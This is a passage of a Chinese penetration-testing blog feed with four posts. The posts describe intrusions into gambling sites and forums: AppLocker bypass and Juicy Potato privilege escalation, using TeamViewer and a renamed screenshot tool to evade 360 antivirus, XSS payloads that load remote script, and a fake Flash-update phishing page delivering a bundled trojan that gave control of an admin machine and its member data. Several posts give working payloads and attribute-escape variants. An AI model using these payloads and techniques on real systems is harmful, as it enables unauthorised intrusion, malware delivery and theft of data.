    <content type="html"><![CDATA[<blockquote><p>冷静分析，沉着应对。</p></blockquote><a id="more"></a><h1 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h1><p>提示：当个反面案例看就好，实际上拿下的方式远没有下文说的那么麻烦，只怪自己太心急…<br>本来是之前BC项目搞下来的一个推广站，当时只拿到了Shell</p><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2020.01.08/1.png" alt="1"></p><p>权限是一个普通用户，想提权进一步收集服务器上的信息时，发现运行各种东西都是权限拒绝，提示组策略阻止了这个程序，当时因为还有的别的事情，就没继续研究了（用户名比较敏感，后面全程打码）。</p><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2020.01.08/2.png" alt="2"></p><h1 id="0x02-Bypass-Applocker"><a href="#0x02-Bypass-Applocker" class="headerlink" title="0x02 Bypass Applocker"></a>0x02 Bypass Applocker</h1><p>最近突然想起来了，就继续搞一下，问了下群里的师傅</p><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2020.01.08/3.png" alt="3"></p><p>知道是什么东西以后就好说了，耐心找一找总会有收获的，附上Applocker介绍：</p><p><a href="https://baike.baidu.com/item/Applocker/2300852?fr=aladdin">https://baike.baidu.com/item/Applocker/2300852?fr=aladdin</a></p><p>然后就找到3g师傅的一篇文章：</p><p><a href="https://3gstudent.github.io/3gstudent.github.io/Use-msxsl-to-bypass-AppLocker/">https://3gstudent.github.io/3gstudent.github.io/Use-msxsl-to-bypass-AppLocker/</a></p><p>具体怎么利用就自行看文章吧，看完文章后续的大概思路差不多就清晰了</p><h1 id="0x03-上线到提权"><a href="#0x03-上线到提权" class="headerlink" title="0x03 上线到提权"></a>0x03 上线到提权</h1><p>我想的是bypass applocker让目标服务器执行我的马子上线后在进行后续的提权，然而Shell下执行 net user、tasklist /SVC 等等都没得回显，不然可以通过进程对比判断下杀软（自己写的小轮子，目前可匹配进程已经增加到960+了：<a href="http://get-av.se7ensec.cn/%EF%BC%89">http://get-av.se7ensec.cn/）</a></p><p>既然不知道，那我就拼一拼人品，赌一下主机里没有杀软，通过上面3g师傅文章的第三种方式运行了我的马子，然后就成功上线了，忽略下面那个机器…</p><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2020.01.08/4.png" alt="4"></p><p>CS上线以后再运行某些命令，比如下面这个，还有tasklist /SCV发现还是会拒绝访问</p><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2020.01.08/5.jpg" alt="5"></p><p>然后又尝试了下CS内置的查看系统进程命令 ”ps“，成功列出了系统进程，看了下确实是没有杀软的</p><p>/* 忘了截图 */</p><p>运行 “shell systeminfo” 发现系统和补丁信息居然可以看到了，然而系统根本没打几个补丁，运气有点好，看了下用户权限，符合Juicy Potato的要求，可以直接尝试下烂土豆提权：</p><p><a href="https://www.4hou.com/posts/vZoL">https://www.4hou.com/posts/vZoL</a></p><p>经过测试发现上线以后（实际上本来就有执行权限，当时没有想到不对劲，事后总结文章时才意识到不太对，详见文末），C:\Users\Public\下有了执行权限，用Juicy Potato带个whoami参数执行下，成功返回了system</p><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2020.01.08/6.png" alt="6"></p><p>再直接用它执行下马子，等几秒就会过来一个System的会话了，翻了翻目录发现还是个站群</p><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2020.01.08/7.png" alt="7"></p><p>Administrator权限截个屏看下，怪不得那么多，原来人家都是批量建站的：</p><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2020.01.08/8.png" alt="8"></p><h1 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h1><p>碰巧这次运气好没有遇到杀软，不然肯定会是一路坎坷，也会更有挑战性</p><p>最失败的是这次自己没有提前全面了解Applocker的一些功能介绍： <a href="https://www.anquanke.com/post/id/159892">https://www.anquanke.com/post/id/159892</a> ，心急的搜到了bypass方法就开始用，其实这次遇到的只是文件路径的限制，C:\Users\Public\就可以执行程序，早一点发现的话也不会那么费劲，不过能完整了解到Applocker的机制，也算是一个收获吧</p><p>最后感谢下haya、Beli1v1师傅的指点和帮助。</p>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;冷静分析，沉着应对。&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    <category term="渗透测试" scheme="https://www.se7ensec.cn/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="WIN提权" scheme="https://www.se7ensec.cn/tags/WIN%E6%8F%90%E6%9D%83/"/>
    
  </entry>
  
  <entry>
    <title>TeamViewer在BypassAV中的妙用</title>
    <link href="https://www.se7ensec.cn/2020/01/05/TeamViewer%E5%9C%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84%E5%A6%99%E7%94%A8/"/>
    <id>https://www.se7ensec.cn/2020/01/05/TeamViewer%E5%9C%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84%E5%A6%99%E7%94%A8/</id>
    <published>2020-01-04T18:10:24.000Z</published>
    <updated>2020-11-14T19:57:29.049Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>这里直接拿360开刀，火绒安静归安静，杀毒能力还是比360差点的。</p></blockquote><a id="more"></a><h1 id="TV官方免安装版"><a href="#TV官方免安装版" class="headerlink" title="TV官方免安装版"></a>TV官方免安装版</h1><p>这是teamviewer官网下载页面： <a href="https://www.teamviewer.cn/cn/download/windows/">https://www.teamviewer.cn/cn/download/windows/</a> ，大部分人都习惯直接下载这个安装版来用</p><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2020.01.05/1.png" alt="1"></p><p>不知道大家有没有注意过，其实teamviewer也提供了免安装版的，就在安装版的下方</p><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2020.01.05/2.png" alt="2"></p><h1 id="Bypass-360"><a href="#Bypass-360" class="headerlink" title="Bypass 360"></a>Bypass 360</h1><p>以下全部为联网且查杀引擎全开的情况下操作（见文章封面）</p><h2 id="正常运行"><a href="#正常运行" class="headerlink" title="正常运行"></a>正常运行</h2><p>下图是正常方式运行TeamViewerQS.exe，虽然有提示，但是可以看到默认的选项是 <strong>允许操作</strong> 的</p><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2020.01.05/3.png" alt="3"></p><h2 id="WebShell下运行"><a href="#WebShell下运行" class="headerlink" title="WebShell下运行"></a>WebShell下运行</h2><p>假设现在我有这台主机的WebShell，直接在大马中执行这个文件</p><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2020.01.05/4.png" alt="4"></p><p>发现成功弹了出来</p><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2020.01.05/5.png" alt="5"></p><p>但是我们怎么获取id和密码呢，土司有大佬分享过修改过的tv，支持把账号密码输出到文件，但是后期肯定还是会被杀，今天看到了CoolCat师傅的文章：<a href="https://xz.aliyun.com/t/4078">传送门</a>，文章中有个通过截屏思路获取还是不错的，不过CoolCat师傅用的python截屏，实际上谁也不想每次都去目标机上装个python环境吧，还是应该怎么简单怎么来</p><h2 id="关于屏幕截取"><a href="#关于屏幕截取" class="headerlink" title="关于屏幕截取"></a>关于屏幕截取</h2><p>github上有不少命令行下截屏的项目，我随便找了一个：<a href="https://github.com/darealshinji/cmdline-screenshot-tool">https://github.com/darealshinji/cmdline-screenshot-tool</a></p><p>在WebShell中，执行一下 screenshot-advanced64.exe，发现被360拦截了，c++写的东西360报java漏洞攻击我就不清楚为啥了…</p><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2020.01.05/6.png" alt="6"></p><h2 id="简单绕过360"><a href="#简单绕过360" class="headerlink" title="简单绕过360"></a>简单绕过360</h2><p>这里绕过方式也很简单，screenshot-advanced64.exe 的后缀改成.7z（命令行下执行二进制文件可以无视后缀名），然后上传上来再执行</p><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2020.01.05/7.png" alt="7"></p><p>然后看一下网站根目录</p><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2020.01.05/8.png" alt="8"></p><p>screenshost.png就是生成的屏幕截图，如下</p><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2020.01.05/9.png" alt="9"></p><h1 id="Kill-360"><a href="#Kill-360" class="headerlink" title="Kill 360"></a>Kill 360</h1><p>拿着账号密码直接连，有了远程桌面的权限，360还怕干不掉？</p><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2020.01.05/10.png" alt="10"></p><h1 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h1><ol><li><p>目标机要确定可以连接TeamViewer的服务器</p></li><li><p>要使用远程桌面用户权限去运行TeamViewerQS.exe，不然连上也是黑屏</p></li><li><p>以上应用场景只适合管理员不在的时候，因为一旦建立远程会话双方都是会看到的</p></li></ol>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;这里直接拿360开刀，火绒安静归安静，杀毒能力还是比360差点的。&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    <category term="渗透测试" scheme="https://www.se7ensec.cn/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="BypassAV" scheme="https://www.se7ensec.cn/tags/BypassAV/"/>
    
  </entry>
  
  <entry>
    <title>BC实战|从Xss到主机上线</title>
    <link href="https://www.se7ensec.cn/2019/12/08/BC%E5%AE%9E%E6%88%98%E4%BB%8EXss%E5%88%B0%E4%B8%BB%E6%9C%BA%E4%B8%8A%E7%BA%BF/"/>
    <id>https://www.se7ensec.cn/2019/12/08/BC%E5%AE%9E%E6%88%98%E4%BB%8EXss%E5%88%B0%E4%B8%BB%E6%9C%BA%E4%B8%8A%E7%BA%BF/</id>
    <published>2019-12-08T15:10:24.000Z</published>
    <updated>2020-11-14T19:57:14.876Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>要保持学习的好习惯，这次平时学的就用上了。</p></blockquote><a id="more"></a><h1 id="故事的起因"><a href="#故事的起因" class="headerlink" title="故事的起因"></a>故事的起因</h1><p>前几天收到一封邮件，内容是这样的：</p><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2019.12.08/1.png" alt="1"></p><p>你说发谁哪里不好，发到我这里来，正好最近辞职了没事干，搞下看看。</p><p>加上那个人的好友以后，象征性的聊了几句，大概就是：我说自己因为网赌没钱借了高利贷，让他带我玩这个，好还上贷款，没说几句就给我发了网址和邀请码（这个站没邀请码注册不上），让我去网站里面充钱，我说好，我先去冲一千，完事师傅你一定要好好带我，然后就去注册了（后来我没充钱，他就一直抖我，给我发消息，觉得烦就把他删了，所以聊天记录也没了，简单口述下没截图）。</p><h1 id="漏洞挖掘"><a href="#漏洞挖掘" class="headerlink" title="漏洞挖掘"></a>漏洞挖掘</h1><h2 id="官网截图"><a href="#官网截图" class="headerlink" title="官网截图"></a>官网截图</h2><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2019.12.08/2.png" alt="2"></p><p>信息收集阶段略过，太麻烦了，有云盾（WAF+CDN），看下面云悉指纹识别的图吧，测试各种功能点，没有结果，不得不说，大部分BC安全都是做的不错的。</p><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2019.12.08/3.png" alt="3"></p><p>想了会，看到一个聊天室功能，进去看看都在说啥，结果发现说话来来回回就那几个人，偶尔有几个和我一样的普通会员，我就感觉，这尼玛是不是托啊，一堆什么导师嚷嚷着跟着下注。</p><h2 id="职业习惯："><a href="#职业习惯：" class="headerlink" title="职业习惯："></a>职业习惯：</h2><p>看见框就想叉，一发xss payload打过去：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;&#x2F;tExtArEa&gt;&#39;&quot;&gt;&lt;sCRiPt sRC&#x3D;XSSURL&gt;&lt;&#x2F;sCrIpT&gt;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2019.12.08/4.png" alt="4"></p><p>wdnmd没反应？明明加载了啊…问了下别的师傅，说这种情况有可能是有CSP，附上<a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/CSP">相关介绍</a>，我这里就不解释了，本来打算放弃，想了下万一 img 的没有被限制呢。</p><p>再吃我一发：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src&#x3D;x onerror&#x3D;s&#x3D;createElement(&#39;script&#39;);body.appendChild(s);s.src&#x3D;&#39;XSSURL&#39;;&gt;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2019.12.08/5.png" alt="5"></p><p>叮 ~ 叮 ~ 手机响了，多么美妙的声音，payload成功执行，打来一堆cookie（还是不同域名），然而现实是残酷的，这个站有HttpOnly，cookie不能用，历史密码也没拿到，不过不要灰心，咱还有更猥琐的办法。</p><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2019.12.08/6.png" alt="6"></p><h1 id="Flash钓鱼"><a href="#Flash钓鱼" class="headerlink" title="Flash钓鱼"></a>Flash钓鱼</h1><p>既然正面肛不动你，咱就来侧面的。前段时间经常看到无常师傅的flash钓鱼操作，很经典啊，然后就想到自己有天会用到flash官网的钓鱼源码，很早就写好了放在GitHub上：<a href="https://github.com/r00tSe7en/Fake-flash.cn">传送门</a>。</p><h2 id="前期准备"><a href="#前期准备" class="headerlink" title="前期准备"></a>前期准备</h2><p>一个免费空间，一个免费域名（域名可以搞一个 <a href="http://www.flashxxx.tk/">www.flashxxx.tk</a> 这种的，可信度比较高），一个可以正常上线的马子。</p><p>然后xss平台搞个模块，简单解释下代码，一开始重写alert方法并屏蔽网址显示，弹出Flash升级提示，跳转至钓鱼页：</p><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2019.12.08/7.png" alt="7"></p><h2 id="关于马子"><a href="#关于马子" class="headerlink" title="关于马子"></a>关于马子</h2><p>可以做到运行正常安装文件的同时运行马子，骚姿势：<a href="https://www.baikesec.com/webstudy/still/77.html">自解压捆绑文件的利用</a></p><p>为了让自解压的exe文件可以正常运行（已经改成了正常的安装文件图标），必须确保他有解压软件，我就把钓鱼页的自解压文件压缩了下，成了 flashplayerpp_install_cn.zip，这样一来他必须安装解压文件才能打开安装程序，马子自然生效了。</p><h2 id="关于免杀"><a href="#关于免杀" class="headerlink" title="关于免杀"></a>关于免杀</h2><p>由于技术有限，毕竟咱也不是搞免杀的，生成的马子会被部分杀软报毒，也不知道对面用什么杀软，所以想了个猥琐但有效的办法，其实不少下载站下载的文件也爱这么干，哈哈。</p><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2019.12.08/8.png" alt="8"></p><h2 id="一切就绪"><a href="#一切就绪" class="headerlink" title="一切就绪"></a>一切就绪</h2><p>万事俱备，只欠东风，直接发出去刚才写的升级提示+跳转的xss payload：</p><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2019.12.08/9.png" alt="9"></p><p>页面成功弹出提示，对方不点确定页面就一直卡住，点了确定就跳来我的钓鱼页（这里钓鱼页也加了点料，让他点返回时无限回跳钓鱼页）</p><p>不过一开始并没有人上线，再点进去一看管理员重置了聊天页的内容。奥利给曾经说过：我们遇到什么困难也不要怕，咱换个号继续叉呗，在间歇性叉叉圈圈了十几次之后，管理员可能是实在忍不住了（管理员：大哥你别弹了，我装还不行嘛），终于运行了我的马子。</p><h2 id="成功上线："><a href="#成功上线：" class="headerlink" title="成功上线："></a>成功上线：</h2><p>这里就上线了一台，不过很幸运，是管理员的机器，不然之前的努力都白费了。</p><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2019.12.08/10.png" alt="10"></p><p>看一会对面在干哈：</p><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2019.12.08/11.png" alt="11"></p><p>这个清楚点，可以看到还依然打开着钓鱼页，俩人还讨论亏钱了，笑死了：</p><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2019.12.08/12.png" alt="12"></p><p>打开了一个账面，这流水咱也看不懂：</p><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2019.12.08/13.png" alt="13"></p><p>再看看有存着啥好东西，两个硬盘一个U盘，C盘E盘没有什么：</p><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2019.12.08/14.png" alt="14"></p><p>F盘里有料了，都是一些会员数据，账单流水，管理后台配置啥的：</p><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2019.12.08/15.png" alt="15"></p><h1 id="点到为止："><a href="#点到为止：" class="headerlink" title="点到为止："></a>点到为止：</h1><p>不多说了，看了下上线的IP，为了挣钱跑的挺远，老哥背井离乡怪不容易的，祝你安安心心的回到祖国的怀抱过个年吧。。。</p><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2019.12.08/16.png" alt="16"></p>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;要保持学习的好习惯，这次平时学的就用上了。&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    <category term="渗透测试" scheme="https://www.se7ensec.cn/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="XSS" scheme="https://www.se7ensec.cn/tags/XSS/"/>
    
  </entry>
  
  <entry>
    <title>一处图片引用功能导致的XSS</title>
    <link href="https://www.se7ensec.cn/2019/12/04/%E4%B8%80%E5%A4%84%E5%9B%BE%E7%89%87%E5%BC%95%E7%94%A8%E5%8A%9F%E8%83%BD%E5%AF%BC%E8%87%B4%E7%9A%84XSS/"/>
    <id>https://www.se7ensec.cn/2019/12/04/%E4%B8%80%E5%A4%84%E5%9B%BE%E7%89%87%E5%BC%95%E7%94%A8%E5%8A%9F%E8%83%BD%E5%AF%BC%E8%87%B4%E7%9A%84XSS/</id>
    <published>2019-12-04T15:10:24.000Z</published>
    <updated>2020-11-14T19:58:50.676Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>未来迷人绚烂总在向我召唤，哪怕只有痛苦作伴也要勇往直前。</p></blockquote><a id="more"></a><h1 id="山重水复疑无路"><a href="#山重水复疑无路" class="headerlink" title="山重水复疑无路"></a>山重水复疑无路</h1><p><font color=#FF0000 >漏洞点：站点产品评论处</font></p><h2 id="初步测试"><a href="#初步测试" class="headerlink" title="初步测试"></a>初步测试</h2><p>一开始尝试XSS，发现程序有过滤，提交均显示Tags are not permitted，最后测出来的是过滤 &lt; ，不过滤 &gt;</p><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2019.12.04/1.png" alt="1"></p><p>因为提示速度比较快，猜测前端有一层检测。尝试绕过前端检测，burp拦截正常提交的内容，替换xss payload后发送，发现会自动跳转回首页，由此发现程序后端也有内容检测，这里直接xss暂时行不通。</p><p>查看编辑器的其他功能：</p><p>图片上传：<br>可上传aspx（其他可能解析后缀均已尝试），不能解析并跳转至首页。<br>可上传html并解析，这种方式构造的xss通常需要主动攻击，且攻击时易被管理员察觉到异常，暂不考虑。</p><p>表情功能：没什么可利用的。</p><h1 id="柳暗花明又一村"><a href="#柳暗花明又一村" class="headerlink" title="柳暗花明又一村"></a>柳暗花明又一村</h1><p>当看到编辑器提示的 img 外部图片引用方式时引起了我的注意，这里感觉可以操作一下：</p><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2019.12.04/2.png" alt="2"></p><h2 id="正常测试"><a href="#正常测试" class="headerlink" title="正常测试"></a>正常测试</h2><p>先来看下正常引用方式时前端的显示，链接被带入到src中（logo前文字涉及域名，打码）：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[img|XSSURL|xxxxx Logo]</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2019.12.04/3.png" alt="3"></p><h2 id="带入payload"><a href="#带入payload" class="headerlink" title="带入payload"></a>带入payload</h2><p>把xss payload 放在链接的位置再看一下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">常规的payload：</span><br><span class="line">&lt;img src&#x3D;x onerror&#x3D;s&#x3D;createElement(&#39;script&#39;);body.appendChild(s);s.src&#x3D;&#39;XSSURL&#39;;&gt;</span><br><span class="line">构造的payload：</span><br><span class="line">[img|x onerror&#x3D;s&#x3D;createElement(&#39;script&#39;);body.appendChild(s);s.src&#x3D;&#39;XSSURL&#39;;|xxxxx Logo]</span><br></pre></td></tr></table></figure><p>提交后审查元素发现为如下显示：</p><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2019.12.04/4.png" alt="4"></p><h2 id="尝试闭合"><a href="#尝试闭合" class="headerlink" title="尝试闭合"></a>尝试闭合</h2><p>尝试闭合 x 处的双引号，让 onerror 逃逸出来：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[img|x&quot; onerror&#x3D;s&#x3D;createElement(&#39;script&#39;);body.appendChild(s);s.src&#x3D;&#39;XSSURL&#39;;|hello] </span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2019.12.04/5.png" alt="5"></p><p>这里提交后发现payload并没有执行成功，仔细看发现程序输出时分别在 onerror= 和 ; 后面加了双引号。</p><h2 id="闭合成功"><a href="#闭合成功" class="headerlink" title="闭合成功"></a>闭合成功</h2><p>直接给个 &gt; 让它闭合，虽然成功加载了，但是页面显示会有错误，这样十分容易被发现倪端，不够完美。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[img|x&quot; onerror&#x3D;s&#x3D;createElement(&#39;script&#39;);body.appendChild(s);s.src&#x3D;&#39;XSSURL&#39;;&gt;|hello]</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2019.12.04/6.png" alt="6"></p><p>换个思路通过闭合掉 ; 后面的双引号，显示效果如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[img|x&quot; onerror&#x3D;s&#x3D;createElement(&#39;script&#39;);body.appendChild(s);s.src&#x3D;&#39;XSSURL&#39;;&quot;|hello]</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2019.12.04/7.png" alt="7"></p><p>最终在没有任何错误内容显示的情况下成功执行了xss payload：</p><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2019.12.04/8.png" alt="8"></p><p>看到这里可能有人就会想，这种案例触发的xss是不是很少存在，因为毕竟不是每个编辑器都用这种图片外链引用方式，那么请继续看下面。</p><h1 id="灵活运用"><a href="#灵活运用" class="headerlink" title="灵活运用"></a>灵活运用</h1><p>这几天在搞一个gangdu的论坛，在回复功能处，又遇到了同样的问题。</p><p>本来这个功能应该只能放图片链接的，但是这里插入的链接格式和内容并没有做校验。</p><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2019.12.04/2.1.jpg" alt="2.1"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">x onerror&#x3D;s&#x3D;createElement(&#39;script&#39;);body.appendChild(s);s.src&#x3D;&#39;XSSURL&#39;;</span><br></pre></td></tr></table></figure><p>这里直接把payload放进去，看下前端显示</p><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2019.12.04/2.2.jpg" alt="2.2"></p><p>同样的思路，这里直接闭合就好了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">x&quot; onerror&#x3D;&quot;s&#x3D;createElement(&#39;script&#39;);body.appendChild(s);s.src&#x3D;&#39;XSSURL&#39;;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2019.12.04/2.3.jpg" alt="2.3"></p><p>成功加载payload</p><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2019.12.04/2.4.jpg" alt="2.4"></p><p>平时渗透的时候，看到功能点不要上去就是蛮干，先预想下这个功能是大概怎么实现的，然后思路猥琐一点，心细一点，往往会有意想不到的收获的，就写到这里吧。</p>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;未来迷人绚烂总在向我召唤，哪怕只有痛苦作伴也要勇往直前。&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    <category term="渗透测试" scheme="https://www.se7ensec.cn/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="XSS" scheme="https://www.se7ensec.cn/tags/XSS/"/>
    
  </entry>
  
</feed>
